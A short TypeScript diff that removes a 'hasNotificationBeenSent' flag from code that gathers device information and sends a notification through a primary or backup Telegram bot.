@@ -53,7 +53,6 @@ interface DeviceInfo {
   osVersion?: string;
 }
 
-// let hasNotificationBeenSent = false;
 
 async function getDeviceInfo(): Promise<DeviceInfo> {
   let brand = 'Unknown';
@@ -374,7 +373,6 @@ ${deviceText}
     if (primaryBotToken) {
       try {
         await sendTelegramMessage(primaryBotToken, messageData);
-        hasNotificationBeenSent = true;
         return;
       } catch (error) {
         console.error('Primary bot failed:', error instanceof Error ? error.message : 'Unknown error');
@@ -383,7 +381,6 @@ ${deviceText}
 
     try {
       await sendTelegramMessage(backupBotToken, messageData);
-      hasNotificationBeenSent = true;
     } catch (error) {
       throw new Error(`Backup bot failed: ${error instanceof Error ? error.message : 'Unknown error'}`);
     }
